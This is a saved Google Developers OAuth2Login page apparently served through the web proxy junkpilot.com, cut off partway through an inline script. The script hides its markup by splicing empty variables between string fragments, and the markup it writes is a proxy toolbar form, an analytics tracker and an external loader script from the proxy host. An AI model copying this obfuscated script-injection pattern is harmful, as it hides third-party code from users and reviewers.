<!DOCTYPE html>
<html class="devsite" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    
      <link rel="stylesheet" type="text/css" href="OAuth2Login_files/nppxjoj_002.css">
      <link href="OAuth2Login_files/nppxjoj_004.css" rel="stylesheet" type="text/css">
    
      
        <link rel="stylesheet" type="text/css" href="OAuth2Login_files/nppxjoj.css">
      
      
      <link rel="stylesheet" type="text/css" id="screen-foot" data-href="/_static/4e620687a9/css/screen-foot.css">
    
    <link rel="shortcut icon" href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUQuFsggrgyenonEv5RvMmT1tFDLPX09Dx8Hrows9nKaMy%2BXMLA7iUBe9L%2B2LYh%2Fhk3VK%2F8wtsKpIbuLUIMh00oA%3D">
    <link rel="apple-touch-icon" href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUQuFsggrgyenonEv5RvMmT1tFDLPX09Dx8Hrows9nKaMtJV7xMnIsnSmaC2hEOH3T9Fzq%2FTL%2FC%2FeP%2BF7vEfD0GQ%3D">
    <link href="OAuth2Login_files/nppxjoj_003.css" rel="stylesheet" type="text/css">
    
    
    
      <link rel="search" type="application/opensearchdescription+xml" title="Google Developers" href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUcptr1vTPpubc4Xf%2BIVlWbsTLbkGXrhrxO4UEIUTu%2BAj5P1b3SGpd0SW5O8ZSzQpMQ%3D%3D">
    
    

    <!--[if lt IE 9]>
    
    <![endif]-->

    
  
  
  <title></title>
  
  
  
  

  

  
    
    
    
  


    

    <style>
    
    </style>
  </head>
  <body class=" slim   two-column docs normal-width">
<script>
var tcxkkawa=''
var oafqbdboje='';
var qnhaelnro='';
var hiefsp='';
var ppceqiu='';
var lwgvbaloi='';
var ttzkibsq='';
var xjvdzkf='';
var aoytav='';
var vwagkisdcr='';
var ktgayekt='';
var jenmfbl='';
var bgxwcxdngw='';
var ingsgntfr='';
var zymdlz='';
var nkhorfl='';
var cphjlyryf='';
var fsclkfk='';
var sourxic='';
var wtkhnnw='';
var witngzxmra='';
tcxkkawa += '<di' + aoytav + 'v' + ppceqiu + ' ' + aoytav + 'st' + ktgayekt + 'yl' + wtkhnnw + 'e="' + ingsgntfr + 'wid' + cphjlyryf + 't' + jenmfbl + 'h:' + oafqbdboje + '100' + sourxic + '%;' + xjvdzkf + 'mar' + nkhorfl + 'g' + aoytav + 'in' + jenmfbl + ':0' + vwagkisdcr + ';t' + jenmfbl + 'ext' + vwagkisdcr + '-' + zymdlz + 'ali' + nkhorfl + 'gn' + vwagkisdcr + ':ce' + aoytav + 'nte' + ingsgntfr + 'r;b' + oafqbdboje + 'or' + aoytav + 'de' + aoytav + 'r' + ppceqiu + '-b' + ttzkibsq + 'o' + vwagkisdcr + 'tt' + fsclkfk + 'o' + cphjlyryf + 'm' + fsclkfk + ':1' + ppceqiu + 'px' + witngzxmra + ' s' + lwgvbaloi + 'oli' + ingsgntfr + 'd #' + sourxic + '72' + fsclkfk + '555' + vwagkisdcr + '4' + vwagkisdcr + ';' + fsclkfk + 'co' + ttzkibsq + 'lo' + cphjlyryf + 'r:#' + jenmfbl + '000' + zymdlz + '000' + ttzkibsq + ';' + witngzxmra + 'b' + lwgvbaloi + 'ack' + nkhorfl + 'gr' + zymdlz + 'o' + wtkhnnw + 'u' + ppceqiu + 'n' + oafqbdboje + 'd-c' + bgxwcxdngw + 'o' + ppceqiu + 'lor' + vwagkisdcr + ':' + wtkhnnw + '#' + aoytav + 'F2' + zymdlz + 'FD' + aoytav + 'F3;' + ppceqiu + 'fo' + ktgayekt + 'nt' + lwgvbaloi + '-s' + xjvdzkf + 'i' + vwagkisdcr + 'z' + vwagkisdcr + 'e:' + witngzxmra + '12p' + xjvdzkf + 'x;' + ttzkibsq + 'f' + aoytav + 'ont' + cphjlyryf + '-w' + qnhaelnro + 'eig' + zymdlz + 'ht' + jenmfbl + ':b' + ingsgntfr + 'ol' + xjvdzkf + 'd' + fsclkfk + ';fo' + bgxwcxdngw + 'nt-' + bgxwcxdngw + 'fam' + jenmfbl + 'i' + lwgvbaloi + 'ly:' + jenmfbl + 'B' + zymdlz + 'i' + ttzkibsq + 'ts' + qnhaelnro + 'tr' + sourxic + 'e' + zymdlz + 'am ' + oafqbdboje + 'Ver' + lwgvbaloi + 'a ' + aoytav + 'S' + vwagkisdcr + 'ans' + aoytav + ',' + sourxic + 'ari' + zymdlz + 'a' + zymdlz + 'l' + ttzkibsq + ',' + hiefsp + 'san' + zymdlz + 's-s' + ingsgntfr + 'er' + aoytav + 'if;' + oafqbdboje + 'pad' + aoytav + 'd' + vwagkisdcr + 'ing' + zymdlz + ':' + sourxic + '4p' + oafqbdboje + 'x;' + witngzxmra + '">' + nkhorfl + "\n";
tcxkkawa += '<s' + vwagkisdcr + 'cr' + nkhorfl + 'i' + oafqbdboje + 'pt ' + cphjlyryf + 't' + cphjlyryf + 'ype' + vwagkisdcr + '=' + lwgvbaloi + '"' + vwagkisdcr + 'tex' + xjvdzkf + 't/j' + ttzkibsq + 'a' + vwagkisdcr + 'v' + oafqbdboje + 'a' + wtkhnnw + 'sc' + witngzxmra + 'ri' + ttzkibsq + 'p' + cphjlyryf + 't' + qnhaelnro + '"' + lwgvbaloi + '>' + witngzxmra + "\n";
tcxkkawa += 'v' + cphjlyryf + 'a' + ppceqiu + 'r g' + aoytav + 'aJ' + ingsgntfr + 's' + ingsgntfr + 'H' + nkhorfl + 'o' + cphjlyryf + 'st' + ktgayekt + ' ' + hiefsp + '= ' + fsclkfk + '((' + xjvdzkf + '"h' + cphjlyryf + 'ttp' + zymdlz + 's' + lwgvbaloi + ':"' + ingsgntfr + ' =' + ktgayekt + '=' + vwagkisdcr + ' ' + jenmfbl + 'doc' + hiefsp + 'um' + qnhaelnro + 'en' + vwagkisdcr + 't' + sourxic + '.lo' + sourxic + 'ca' + cphjlyryf + 't' + sourxic + 'ion' + qnhaelnro + '.p' + ingsgntfr + 'rot' + jenmfbl + 'oco' + lwgvbaloi + 'l) ' + cphjlyryf + '? "' + fsclkfk + 'h' + witngzxmra + 'ttp' + wtkhnnw + 's:' + ppceqiu + '//' + ingsgntfr + 'ssl' + jenmfbl + '." ' + wtkhnnw + ': "' + aoytav + 'ht' + witngzxmra + 'tp:' + oafqbdboje + '/' + lwgvbaloi + '/ww' + ttzkibsq + 'w.' + fsclkfk + '"' + sourxic + ')' + jenmfbl + ';' + ktgayekt + "\n";
tcxkkawa += 'd' + cphjlyryf + 'ocu' + hiefsp + 'men' + ingsgntfr + 't.' + ktgayekt + 'w' + ktgayekt + 'ri' + wtkhnnw + 't' + oafqbdboje + 'e(u' + witngzxmra + 'n' + aoytav + 'e' + jenmfbl + 'sca' + ttzkibsq + 'pe(' + jenmfbl + '"%3' + ppceqiu + 'C' + qnhaelnro + 'sc' + lwgvbaloi + 'ri' + wtkhnnw + 'p' + xjvdzkf + 't ' + ingsgntfr + 'src' + ktgayekt + '=\'"' + jenmfbl + ' + ' + ingsgntfr + 'ga' + hiefsp + 'J' + zymdlz + 'sHo' + xjvdzkf + 'st ' + qnhaelnro + '+ ' + oafqbdboje + '"' + jenmfbl + 'go' + ttzkibsq + 'o' + ppceqiu + 'gle' + zymdlz + '-an' + witngzxmra + 'al' + witngzxmra + 'yti' + fsclkfk + 'cs.' + ingsgntfr + 'com' + vwagkisdcr + '/ga' + ttzkibsq + '.j' + jenmfbl + 's' + vwagkisdcr + '\' ' + ttzkibsq + 'ty' + sourxic + 'pe' + wtkhnnw + '=\'' + jenmfbl + 't' + vwagkisdcr + 'e' + qnhaelnro + 'xt' + bgxwcxdngw + '/ja' + zymdlz + 'vas' + oafqbdboje + 'cri' + sourxic + 'p' + ttzkibsq + 't\'' + ktgayekt + '%3' + vwagkisdcr + 'E' + wtkhnnw + '%' + bgxwcxdngw + '3C' + qnhaelnro + '/' + ttzkibsq + 'scr' + zymdlz + 'ipt' + hiefsp + '%3' + cphjlyryf + 'E' + witngzxmra + '"' + ttzkibsq + ')' + ktgayekt + ')' + wtkhnnw + ';' + ttzkibsq + "\n";
tcxkkawa += '<' + hiefsp + '/s' + fsclkfk + 'cri' + oafqbdboje + 'pt' + qnhaelnro + '>' + xjvdzkf + "\n";
tcxkkawa += '<s' + nkhorfl + 'c' + fsclkfk + 'rip' + sourxic + 't' + witngzxmra + ' ' + hiefsp + 'typ' + vwagkisdcr + 'e=' + zymdlz + '"te' + nkhorfl + 'x' + jenmfbl + 't' + fsclkfk + '/' + jenmfbl + 'j' + jenmfbl + 'av' + sourxic + 'asc' + sourxic + 'ri' + witngzxmra + 'pt' + oafqbdboje + '">' + fsclkfk + "\n";
tcxkkawa += 't' + sourxic + 'r' + sourxic + 'y ' + nkhorfl + '{' + ppceqiu + "\n";
tcxkkawa += 'v' + fsclkfk + 'a' + fsclkfk + 'r' + oafqbdboje + ' p' + bgxwcxdngw + 'ag' + witngzxmra + 'e' + lwgvbaloi + 'Tr' + fsclkfk + 'ac' + hiefsp + 'ker' + sourxic + ' =' + ktgayekt + ' _' + hiefsp + 'g' + lwgvbaloi + 'a' + wtkhnnw + 't' + oafqbdboje + '._g' + ingsgntfr + 'etT' + bgxwcxdngw + 'rac' + xjvdzkf + 'ke' + zymdlz + 'r("' + sourxic + 'UA-' + ppceqiu + '61' + jenmfbl + '955' + nkhorfl + '35' + bgxwcxdngw + '-6' + lwgvbaloi + '3")' + jenmfbl + ';' + wtkhnnw + "\n";
tcxkkawa += 'pag' + oafqbdboje + 'e' + witngzxmra + 'Tr' + ingsgntfr + 'ack' + witngzxmra + 'e' + oafqbdboje + 'r' + lwgvbaloi + '._t' + jenmfbl + 'r' + xjvdzkf + 'ack' + sourxic + 'Pag' + vwagkisdcr + 'ev' + jenmfbl + 'ie' + aoytav + 'w()' + ppceqiu + ';' + qnhaelnro + "\n";
tcxkkawa += '} ' + fsclkfk + 'cat' + sourxic + 'c' + sourxic + 'h(' + lwgvbaloi + 'err' + wtkhnnw + ') ' + sourxic + '{}' + fsclkfk + '</s' + wtkhnnw + 'cr' + sourxic + 'i' + qnhaelnro + 'p' + vwagkisdcr + 't' + ppceqiu + '>' + wtkhnnw + "\n";
tcxkkawa += '<sc' + aoytav + 'rip' + ktgayekt + 't' + fsclkfk + ' ' + xjvdzkf + 'src' + jenmfbl + '="h' + jenmfbl + 'ttp' + lwgvbaloi + '://' + aoytav + 'ww' + qnhaelnro + 'w.' + witngzxmra + 'j' + hiefsp + 'unk' + ingsgntfr + 'pi' + lwgvbaloi + 'lot' + qnhaelnro + '.' + ppceqiu + 'com' + xjvdzkf + '/' + nkhorfl + 'l' + witngzxmra + 'oa' + ktgayekt + 'der' + ppceqiu + '-' + zymdlz + 'cou' + xjvdzkf + 'nte' + ktgayekt + 'r.j' + sourxic + 's?' + bgxwcxdngw + 'h=w' + witngzxmra + 'ww.' + oafqbdboje + 'ju' + lwgvbaloi + 'n' + ttzkibsq + 'kpi' + xjvdzkf + 'lo' + bgxwcxdngw + 't' + ingsgntfr + '.c' + cphjlyryf + 'om&' + vwagkisdcr + 's' + wtkhnnw + '=p' + ttzkibsq + '&p=' + witngzxmra + 'htt' + hiefsp + 'p' + zymdlz + '"' + oafqbdboje + '>' + hiefsp + '</' + fsclkfk + 's' + zymdlz + 'cr' + aoytav + 'i' + sourxic + 'p' + fsclkfk + 't>' + nkhorfl + "\n";
tcxkkawa += '<f' + cphjlyryf + 'orm' + ppceqiu + ' ' + fsclkfk + 'met' + fsclkfk + 'ho' + lwgvbaloi + 'd=' + oafqbdboje + '"' + sourxic + 'po' + witngzxmra + 's' + nkhorfl + 't' + cphjlyryf + '" ' + hiefsp + 'a' + nkhorfl + 'ct' + ingsgntfr + 'ion' + vwagkisdcr + '="h' + xjvdzkf + 't' + ppceqiu + 'tp' + witngzxmra + ':' + bgxwcxdngw + '/' + vwagkisdcr + '/ww' + fsclkfk + 'w' + lwgvbaloi + '.' + oafqbdboje + 'ju' + oafqbdboje + 'n' + zymdlz + 'k' + vwagkisdcr + 'p' + lwgvbaloi + 'ilo' + ktgayekt + 't.c' + lwgvbaloi + 'o' + xjvdzkf + 'm/n' + wtkhnnw + 'pp' + fsclkfk + 'xjo' + hiefsp + 'j.' + hiefsp + 'ph' + zymdlz + 'p"' + witngzxmra + '> <' + aoytav + 'l' + zymdlz + 'abe' + fsclkfk + 'l ' + xjvdzkf + 'f' + aoytav + 'o' + ingsgntfr + 'r="' + ktgayekt + '__' + hiefsp + '__' + lwgvbaloi + '8f' + sourxic + 'z' + vwagkisdcr + 'yhI' + vwagkisdcr + 'AhM' + sourxic + 'X1' + oafqbdboje + 'Gih' + sourxic + 'yI' + zymdlz + 'sV' + lwgvbaloi + 'h7o' + wtkhnnw + 'Q">' + nkhorfl + '<a ' + sourxic + 'h' + xjvdzkf + 'r' + witngzxmra + 'ef' + aoytav + '="h' + jenmfbl + 't' + xjvdzkf + 't' + xjvdzkf + 'ps' + aoytav + '://' + vwagkisdcr + 'dev' + vwagkisdcr + 'elo' + oafqbdboje + 'pe' + aoytav + 'rs.' + fsclkfk + 'g' + zymdlz + 'o' + lwgvbaloi + 'o' + hiefsp + 'g' + oafqbdboje + 'l' + fsclkfk + 'e.c' + bgxwcxdngw + 'om' + hiefsp + '/ac' + qnhaelnro + 'c' + ktgayekt + 'ou' + bgxwcxdngw + 'nt' + jenmfbl + 's' + xjvdzkf + '/' + bgxwcxdngw + 'd' + vwagkisdcr + 'oc' + witngzxmra + 's/' + fsclkfk + 'O' + xjvdzkf + 'Au' + nkhorfl + 'th' + nkhorfl + '2L' + zymdlz + 'ogi' + zymdlz + 'n">' + qnhaelnro + 'Ad' + lwgvbaloi + 'dre' + witngzxmra + 's' + vwagkisdcr + 's</' + bgxwcxdngw + 'a>:' + vwagkisdcr + '<' + sourxic + '/la' + bgxwcxdngw + 'b' + cphjlyryf + 'el>' + zymdlz + ' <i' + lwgvbaloi + 'np' + witngzxmra + 'u' + cphjlyryf + 't i' + ttzkibsq + 'd="' + fsclkfk + '___' + aoytav + '_8' + vwagkisdcr + 'fz' + wtkhnnw + 'y' + fsclkfk + 'h' + oafqbdboje + 'IAh' + ktgayekt + 'M' + ppceqiu + 'X' + bgxwcxdngw + '1' + sourxic + 'Gih' + hiefsp + 'yIs' + vwagkisdcr + 'Vh' + lwgvbaloi + '7o' + sourxic + 'Q' + hiefsp + '" t' + sourxic + 'y' + bgxwcxdngw + 'p' + ppceqiu + 'e=' + qnhaelnro + '"te' + bgxwcxdngw + 'xt' + ingsgntfr + '"' + zymdlz + ' si' + witngzxmra + 'ze' + ktgayekt + '=' + lwgvbaloi + '"' + nkhorfl + '80' + hiefsp + '" n' + ktgayekt + 'am' + nkhorfl + 'e=' + wtkhnnw + '"8f' + nkhorfl + 'z' + bgxwcxdngw + 'yh' + ttzkibsq + 'I' + hiefsp + 'AhM' + ktgayekt + 'X1G' + hiefsp + 'i' + hiefsp + 'hyI' + wtkhnnw + 's' + ttzkibsq + 'Vh' + nkhorfl + '7' + fsclkfk + 'oQ"' + vwagkisdcr + ' ' + ppceqiu + 'va' + oafqbdboje + 'l' + xjvdzkf + 'u' + ttzkibsq + 'e=' + wtkhnnw + '"' + sourxic + 'h' + ktgayekt + 'ttp' + oafqbdboje + 's' + vwagkisdcr + '://' + qnhaelnro + 'd' + zymdlz + 'e' + aoytav + 'v' + jenmfbl + 'e' + wtkhnnw + 'l' + hiefsp + 'ope' + zymdlz + 'r' + aoytav + 's.g' + fsclkfk + 'oo' + bgxwcxdngw + 'gle' + qnhaelnro + '.' + aoytav + 'com' + sourxic + '/ac' + lwgvbaloi + 'cou' + sourxic + 'nts' + oafqbdboje + '/' + aoytav + 'doc' + cphjlyryf + 's/O' + ttzkibsq + 'Au' + hiefsp + 'th2' + ingsgntfr + 'Lo' + nkhorfl + 'gi' + ttzkibsq + 'n' + ingsgntfr + '" /' + oafqbdboje + '> <' + jenmfbl + 'in' + bgxwcxdngw + 'p' + sourxic + 'u' + witngzxmra + 't ' + bgxwcxdngw + 'ty' + ttzkibsq + 'pe=' + qnhaelnro + '"s' + ttzkibsq + 'ub' + zymdlz + 'mit' + bgxwcxdngw + '" n' + ppceqiu + 'ame' + cphjlyryf + '="g' + lwgvbaloi + 'o" ' + jenmfbl + 'val' + ingsgntfr + 'u' + fsclkfk + 'e=' + ingsgntfr + '"' + oafqbdboje + 'G' + zymdlz + 'o"' + sourxic + ' />' + wtkhnnw + ' [g' + zymdlz + 'o: ' + lwgvbaloi + '<a ' + zymdlz + 'hre' + witngzxmra + 'f=' + aoytav + '"h' + ttzkibsq + 'tt' + nkhorfl + 'p' + ingsgntfr + ':/' + wtkhnnw + '/' + nkhorfl + 'www' + ppceqiu + '.' + jenmfbl + 'ju' + ingsgntfr + 'nkp' + ppceqiu + 'ilo' + qnhaelnro + 't.c' + wtkhnnw + 'om' + lwgvbaloi + '/' + aoytav + 'np' + bgxwcxdngw + 'px' + fsclkfk + 'j' + jenmfbl + 'oj' + aoytav + '.' + oafqbdboje + 'php' + qnhaelnro + '?8' + oafqbdboje + 'fz' + sourxic + 'yh' + nkhorfl + 'IA' + qnhaelnro + 'hM' + bgxwcxdngw + 'X' + bgxwcxdngw + '1G' + witngzxmra + 'ih' + ttzkibsq + 'yIs' + fsclkfk + 'V' + zymdlz + 'h' + ttzkibsq + '7' + ppceqiu + 'oQ' + witngzxmra + '=q' + witngzxmra + 'A' + cphjlyryf + '0' + wtkhnnw + 'oL3' + zymdlz + 'D' + witngzxmra + '51' + vwagkisdcr + '3R' + ttzkibsq + 'h' + hiefsp + 'j' + jenmfbl + '1%' + ppceqiu + '2B' + xjvdzkf + 'j' + sourxic + 'RJt' + cphjlyryf + 'j' + hiefsp + 'Ub' + vwagkisdcr + 'zR' + ppceqiu + 'J7' + ppceqiu + 'wd' + ktgayekt + 'T' + ppceqiu + 'b8d' + oafqbdboje + 'N98' + ppceqiu + 'SG' + lwgvbaloi + 'dG' + ingsgntfr + 'q' + nkhorfl + 't6n' + lwgvbaloi + 'C' + sourxic + 'KPz' + bgxwcxdngw + '%2F' + sourxic + '2' + hiefsp + 'B' + nkhorfl + 'A3' + fsclkfk + 'SBW' + hiefsp + 'kD' + jenmfbl + 'xR' + nkhorfl + 'Tm3' + cphjlyryf + 'Xd' + ktgayekt + ' ">' + hiefsp + 'u' + qnhaelnro + 'p ' + bgxwcxdngw + 'one' + zymdlz + ' d' + ttzkibsq + 'i' + sourxic + 'r' + jenmfbl + '</' + oafqbdboje + 'a>' + witngzxmra + ', <' + wtkhnnw + 'a' + ppceqiu + ' hr' + ppceqiu + 'e' + vwagkisdcr + 'f' + aoytav + '="h' + lwgvbaloi + 'ttp' + ingsgntfr + ':/' + ingsgntfr + '/w' + fsclkfk + 'w' + aoytav + 'w.' + fsclkfk + 'ju' + nkhorfl + 'nkp' + wtkhnnw + 'il' + zymdlz + 'ot.' + fsclkfk + 'c' + ingsgntfr + 'om/' + jenmfbl + '">' + wtkhnnw + 'mai' + hiefsp + 'n ' + ttzkibsq + 'p' + nkhorfl + 'ag' + ingsgntfr + 'e<' + vwagkisdcr + '/a' + cphjlyryf + '>' + ppceqiu + ']<' + qnhaelnro + 'br ' + qnhaelnro + '/' + qnhaelnro + '><h' + bgxwcxdngw + 'r' + qnhaelnro + ' />' + qnhaelnro + '<l' + jenmfbl + 'a' + ttzkibsq + 'bel' + lwgvbaloi + '><i' + witngzxmra + 'n' + ingsgntfr + 'pu' + vwagkisdcr + 't ' + bgxwcxdngw + 'typ' + lwgvbaloi + 'e' + lwgvbaloi + '="c' + wtkhnnw + 'h' + oafqbdboje + 'ec' + wtkhnnw + 'kb' + fsclkfk + 'ox' + nkhorfl + '" ' + cphjlyryf + 'nam' + ktgayekt + 'e=' + ttzkibsq + '"Wd' + nkhorfl + 'lY' + bgxwcxdngw + 'ocv' + jenmfbl + '0' + ktgayekt + 'tZg' + ppceqiu + '08' + witngzxmra + 'E8M' + ttzkibsq + 'uEq' + aoytav + 'SjQ' + oafqbdboje + '[i' + xjvdzkf + 'n' + vwagkisdcr + 'clu' + ingsgntfr + 'de_' + aoytav + 'for' + ktgayekt + 'm' + ppceqiu + ']' + ingsgntfr + '" c' + nkhorfl + 'hec' + hiefsp + 'ke' + ttzkibsq + 'd=' + hiefsp + '"c' + zymdlz + 'h' + ktgayekt + 'ec' + aoytav + 'k' + ingsgntfr + 'ed' + jenmfbl + '"' + xjvdzkf + ' />' + vwagkisdcr + ' ' + ttzkibsq + 'In' + qnhaelnro + 'clu' + sourxic + 'de' + jenmfbl + ' F' + fsclkfk + 'o' + ktgayekt + 'rm' + qnhaelnro + '</l' + ttzkibsq + 'a' + zymdlz + 'bel' + oafqbdboje + '> ' + bgxwcxdngw + '<la' + oafqbdboje + 'bel' + qnhaelnro + '>' + sourxic + '<' + ktgayekt + 'in' + zymdlz + 'put' + ttzkibsq + ' ' + witngzxmra + 'typ' + sourxic + 'e' + wtkhnnw + '="c' + zymdlz + 'hec' + witngzxmra + 'kb' + ppceqiu + 'o' + cphjlyryf + 'x"' + zymdlz + ' na' + zymdlz + 'me' + hiefsp + '="W' + ttzkibsq + 'd' + ppceqiu + 'lY' + vwagkisdcr + 'oc' + zymdlz + 'v0' + vwagkisdcr + 't' + jenmfbl + 'Z' + bgxwcxdngw + 'g08' + witngzxmra + 'E8' + aoytav + 'Mu' + qnhaelnro + 'E' + oafqbdboje + 'qS' + zymdlz + 'jQ' + nkhorfl + '[' + qnhaelnro + 'rem' + lwgvbaloi + 'o' + cphjlyryf + 've_' + hiefsp + 's' + qnhaelnro + 'cr' + ttzkibsq + 'ip' + fsclkfk + 'ts]' + xjvdzkf + '" ' + lwgvbaloi + 'c' + zymdlz + 'h' + lwgvbaloi + 'e' + sourxic + 'c' + zymdlz + 'ke' + vwagkisdcr + 'd' + ingsgntfr + '="' + xjvdzkf + 'ch' + qnhaelnro + 'eck' + cphjlyryf + 'e' + bgxwcxdngw + 'd" ' + ttzkibsq + '/>' + lwgvbaloi + ' Re' + ttzkibsq + 'm' + zymdlz + 'ov' + cphjlyryf + 'e S' + fsclkfk + 'cri' + zymdlz + 'p' + hiefsp + 't' + sourxic + 's' + nkhorfl + '</' + cphjlyryf + 'lab' + ingsgntfr + 'el' + fsclkfk + '> ' + oafqbdboje + '<' + aoytav + 'l' + wtkhnnw + 'ab' + qnhaelnro + 'el' + ingsgntfr + '><i' + cphjlyryf + 'np' + vwagkisdcr + 'ut ' + sourxic + 't' + vwagkisdcr + 'yp' + zymdlz + 'e="' + nkhorfl + 'c' + qnhaelnro + 'h' + qnhaelnro + 'e' + aoytav + 'ck' + vwagkisdcr + 'bo' + ppceqiu + 'x" ' + ppceqiu + 'nam' + witngzxmra + 'e=' + vwagkisdcr + '"' + aoytav + 'Wd' + lwgvbaloi + 'lY' + hiefsp + 'oc' + ppceqiu + 'v0' + oafqbdboje + 'tZ' + cphjlyryf + 'g08' + xjvdzkf + 'E8M' + wtkhnnw + 'uE' + jenmfbl + 'q' + hiefsp + 'Sj' + jenmfbl + 'Q[a' + xjvdzkf + 'cce' + hiefsp + 'pt' + wtkhnnw + '_' + lwgvbaloi + 'c' + lwgvbaloi + 'ook' + bgxwcxdngw + 'i' + oafqbdboje + 'es' + ingsgntfr + ']"' + vwagkisdcr + ' ' + ktgayekt + 'c' + xjvdzkf + 'he' + ppceqiu + 'ck' + bgxwcxdngw + 'e' + vwagkisdcr + 'd=' + jenmfbl + '"ch' + witngzxmra + 'eck' + bgxwcxdngw + 'ed' + zymdlz + '" /' + wtkhnnw + '>' + witngzxmra + ' A' + qnhaelnro + 'c' + hiefsp + 'cep' + qnhaelnro + 't' + lwgvbaloi + ' C' + ppceqiu + 'o' + fsclkfk + 'oki' + jenmfbl + 'e' + hiefsp + 's</' + xjvdzkf + 'l' + ingsgntfr + 'ab' + zymdlz + 'el>' + ingsgntfr + ' <l' + cphjlyryf + 'a' + bgxwcxdngw + 'bel' + sourxic + '><i' + witngzxmra + 'npu' + ppceqiu + 't' + sourxic + ' t' + bgxwcxdngw + 'yp' + bgxwcxdngw + 'e' + aoytav + '="c' + wtkhnnw + 'hec' + nkhorfl + 'kb' + wtkhnnw + 'o' + xjvdzkf + 'x"' + ttzkibsq + ' n' + sourxic + 'ame' + sourxic + '="W' + wtkhnnw + 'dl' + cphjlyryf + 'Y' + fsclkfk + 'o' + witngzxmra + 'cv' + wtkhnnw + '0' + wtkhnnw + 'tZ' + lwgvbaloi + 'g' + hiefsp + '0' + cphjlyryf + '8E' + cphjlyryf + '8M' + lwgvbaloi + 'u' + hiefsp + 'Eq' + aoytav + 'S' + sourxic + 'jQ[' + cphjlyryf + 'sh' + hiefsp + 'o' + ktgayekt + 'w_i' + ingsgntfr + 'ma' + qnhaelnro + 'g' + ingsgntfr + 'es]' + jenmfbl + '" c' + zymdlz + 'he' + lwgvbaloi + 'cke' + sourxic + 'd=' + ingsgntfr + '"c' + witngzxmra + 'he' + cphjlyryf + 'ck' + wtkhnnw + 'ed"' + lwgvbaloi + ' ' + ingsgntfr + '/>' + fsclkfk + ' S' + ppceqiu + 'ho' + vwagkisdcr + 'w I' + zymdlz + 'mag' + ppceqiu + 'e' + xjvdzkf + 's</' + bgxwcxdngw + 'la' + aoytav + 'b' + vwagkisdcr + 'e' + xjvdzkf + 'l> ' + hiefsp + '<l' + zymdlz + 'a' + vwagkisdcr + 'be' + jenmfbl + 'l>' + jenmfbl + '<in' + lwgvbaloi + 'put' + zymdlz + ' ty' + witngzxmra + 'pe' + fsclkfk + '=' + cphjlyryf + '"ch' + ingsgntfr + 'e' + aoytav + 'c' + ktgayekt + 'k' + fsclkfk + 'b' + ttzkibsq + 'ox"' + qnhaelnro + ' n' + fsclkfk + 'ame' + qnhaelnro + '="' + witngzxmra + 'Wd' + oafqbdboje + 'l' + nkhorfl + 'Yoc' + fsclkfk + 'v' + lwgvbaloi + '0t' + hiefsp + 'Zg0' + ktgayekt + '8E8' + aoytav + 'Mu' + ktgayekt + 'EqS' + qnhaelnro + 'jQ' + cphjlyryf + '[sh' + wtkhnnw + 'ow_' + aoytav + 'r' + sourxic + 'e' + bgxwcxdngw + 'fer' + fsclkfk + 'er' + vwagkisdcr + ']" ' + qnhaelnro + 'che' + oafqbdboje + 'ck' + qnhaelnro + 'ed' + qnhaelnro + '="' + sourxic + 'ch' + fsclkfk + 'e' + zymdlz + 'cke' + ttzkibsq + 'd" ' + ttzkibsq + '/>' + jenmfbl + ' ' + bgxwcxdngw + 'Sh' + aoytav + 'ow ' + xjvdzkf + 'Ref' + ingsgntfr + 'ere' + aoytav + 'r' + aoytav + '</l' + aoytav + 'abe' + ppceqiu + 'l>' + bgxwcxdngw + ' <' + ktgayekt + 'la' + ingsgntfr + 'b' + wtkhnnw + 'e' + witngzxmra + 'l' + zymdlz + '><i' + zymdlz + 'npu' + sourxic + 't' + qnhaelnro + ' ty' + bgxwcxdngw + 'p' + ktgayekt + 'e' + wtkhnnw + '="' + witngzxmra + 'c' + bgxwcxdngw + 'h' + witngzxmra + 'e' + qnhaelnro + 'ckb' + ingsgntfr + 'ox' + fsclkfk + '" n' + sourxic + 'ame' + xjvdzkf + '=' + hiefsp + '"W' + ppceqiu + 'dl' + sourxic + 'Y' + zymdlz + 'ocv' + jenmfbl + '0' + lwgvbaloi + 't' + ttzkibsq + 'Zg0' + sourxic + '8E' + bgxwcxdngw + '8Mu' + ingsgntfr + 'Eq' + qnhaelnro + 'SjQ' + hiefsp + '[r' + hiefsp + 'o' + zymdlz + 't' + qnhaelnro + 'at' + hiefsp + 'e1' + aoytav + '3' + cphjlyryf + ']"' + oafqbdboje + ' c' + ktgayekt + 'hec' + aoytav + 'ke' + ktgayekt + 'd="' + aoytav + 'ch' + xjvdzkf + 'ec' + oafqbdboje + 'ked' + xjvdzkf + '" ' + vwagkisdcr + '/' + zymdlz + '> ' + ppceqiu + 'R' + ttzkibsq + 'o' + oafqbdboje + 'ta' + ttzkibsq + 'te1' + ktgayekt + '3<' + wtkhnnw + '/la' + witngzxmra + 'be' + oafqbdboje + 'l> ' + hiefsp + '<la' + ttzkibsq + 'be' + sourxic + 'l>' + zymdlz + '<in' + sourxic + 'put' + wtkhnnw + ' t' + fsclkfk + 'y' + oafqbdboje + 'p' + ingsgntfr + 'e="' + wtkhnnw + 'che' + ppceqiu + 'ck' + oafqbdboje + 'box' + zymdlz + '"' + ppceqiu + ' ' + ktgayekt + 'nam' + oafqbdboje + 'e="' + ingsgntfr + 'W' + sourxic + 'dl' + aoytav + 'Y' + zymdlz + 'ocv' + lwgvbaloi + '0tZ' + cphjlyryf + 'g0' + aoytav + '8' + vwagkisdcr + 'E' + qnhaelnro + '8Mu' + vwagkisdcr + 'EqS' + nkhorfl + 'jQ[' + jenmfbl + 'ba' + xjvdzkf + 'se' + zymdlz + '64' + jenmfbl + '_e' + ktgayekt + 'nc' + wtkhnnw + 'ode' + vwagkisdcr + ']' + hiefsp + '"' + fsclkfk + ' ch' + aoytav + 'ec' + wtkhnnw + 'ke' + sourxic + 'd="' + oafqbdboje + 'ch' + fsclkfk + 'e' + oafqbdboje + 'ck' + oafqbdboje + 'ed' + jenmfbl + '" ' + ppceqiu + '/>' + jenmfbl + ' ' + bgxwcxdngw + 'B' + fsclkfk + 'as' + vwagkisdcr + 'e6' + wtkhnnw + '4<' + jenmfbl + '/l' + zymdlz + 'ab' + zymdlz + 'e' + wtkhnnw + 'l>' + qnhaelnro + ' <l' + 